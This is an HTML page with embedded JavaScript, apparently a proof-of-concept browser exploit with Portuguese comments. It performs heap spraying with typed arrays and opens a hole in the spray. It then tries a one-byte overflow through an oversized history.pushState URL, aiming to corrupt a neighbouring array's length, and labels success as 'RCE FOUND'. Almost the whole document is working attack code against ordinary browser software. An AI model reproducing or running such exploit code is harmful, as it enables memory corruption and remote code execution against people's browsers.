<!DOCTYPE html>
<html>
<head>
    <title>Limit Breaker: Precision 1-Byte Overflow</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .log { border: 1px solid #004400; height: 350px; overflow-y: scroll; padding: 10px; background: #001100; margin-top: 15px; font-size: 14px; }
        .controls { border: 1px solid #444; padding: 20px; background: #111; margin-bottom: 20px; }
        .highlight { color: #ffff00; font-weight: bold; }
        .success { color: #fff; background: #00aa00; padding: 5px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #222; color: white; border: 1px solid #555; }
        button:hover { background: #444; }
    </style>
</head>
<body>
    <h1>LIMIT BREAKER: 1-BYTE PRECISION</h1>
    <p>Payload: 709,522 bytes | Overflow: <span style="color:red">1 byte (0x01)</span></p>
    
    <div class="controls">
        <p>Tamanho do Buraco (Blocos de 4KB):</p>
        <button onclick="runTest(173)">Testar 173 (Apertado)</button>
        <button onclick="runTest(174)">Testar 174 (Ideal?)</button>
        <button onclick="runTest(175)">Testar 175 (Folgado)</button>
    </div>

    <div id="logger" class="log">Aguardando...</div>

    <script>
        const logger = document.getElementById('logger');
        function log(msg, type='') {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.className = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        const PAYLOAD_BASE = 709522; 
        const OVERFLOW_BYTES = 1; // Apenas 1 byte para não disparar erro de cota

        var spray = [];

        async function runTest(holeSize) {
            log("------------------------------------------");
            log(`INICIANDO: Buraco de ${holeSize} blocos.`, 'highlight');
            
            // 1. Limpa memória
            spray = [];
            
            // 2. Spray de Estrutura (Sanduíche)
            // Vamos fazer um spray alternado para garantir que o vizinho seja um Uint32Array
            log("1. Alocando estrutura do Heap...");
            
            for(let i=0; i < 4000; i++) {
                let arr = new Uint32Array(1024); // 4096 bytes
                arr[0] = 0x41414141; // Marker
                arr[1] = i;          // Index
                spray.push(arr);
            }

            // 3. Cria o Buraco
            log(`2. Abrindo buraco de ${holeSize} blocos...`);
            
            // Focamos numa área central do Heap (índice 2000)
            let startIdx = 2000;
            for(let i=0; i < holeSize; i++) {
                spray[startIdx + i] = null;
            }

            // Delay para GC
            log("3. Aguardando alinhamento (GC)...");
            await new Promise(r => setTimeout(r, 500));

            // 4. Injeção Cirúrgica
            log(`4. Injetando Payload (${PAYLOAD_BASE} + 1 byte)...`);
            
            try {
                let base = "A".repeat(PAYLOAD_BASE);
                // Overflow mínimo. 0x01 é seguro.
                // Se cair no Header de tamanho, transforma 0x1000 em 0x1001 ou algo maior dependendo do endianness.
                let overflow = "\x01"; 
                
                let payload = "/" + base + overflow; // O "/" inicial ajuda a evitar validação de protocolo

                history.pushState({}, "pwn_" + holeSize, payload);
                
                // 5. Checagem
                checkCorruption(holeSize, startIdx);

            } catch(e) {
                if(e.message.includes("quota") || e.message.includes("allowed")) {
                    log("ERRO DE COTA: O Payload + Overhead excedeu o limite do browser.", "highlight");
                    log("Tente um buraco MENOR (ex: " + (holeSize-1) + ") para forçar reuso de memória.");
                } else {
                    log("ERRO GERAL: " + e.message, "highlight");
                }
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            log("Verificando vizinhos...");
            let found = false;
            
            // Verifica os arrays LOGO DEPOIS do buraco
            // O buraco acaba em startIdx + holeUsed. O próximo array vivo é startIdx + holeUsed.
            let neighborIdx = startIdx + holeUsed;
            
            // Verifica esse vizinho e os próximos 10 (caso o alinhamento tenha variado)
            for(let i = neighborIdx; i < neighborIdx + 20; i++) {
                let arr = spray[i];
                if(arr) {
                    // Tamanho original é 1024
                    if(arr.length !== 1024) {
                        found = true;
                        log("!!! SUCESSO ABSOLUTO !!!", "success");
                        log(`Array vizinho [${i}] foi atingido!`, "success");
                        log(`Tamanho Original: 1024`, "success");
                        log(`Novo Tamanho: ${arr.length}`, "success");
                        document.body.style.background = "#0f0";
                        alert("RCE FOUND! Hole Size: " + holeUsed);
                        return;
                    }
                }
            }

            if(!found) {
                log("Nenhum array vizinho foi alterado.");
                log("Se não crashou, o byte 0x01 caiu em padding (espaço vazio).");
                log("Tente reduzir o tamanho do buraco em 1.");
            }
        }
    </script>
</body>
</html>
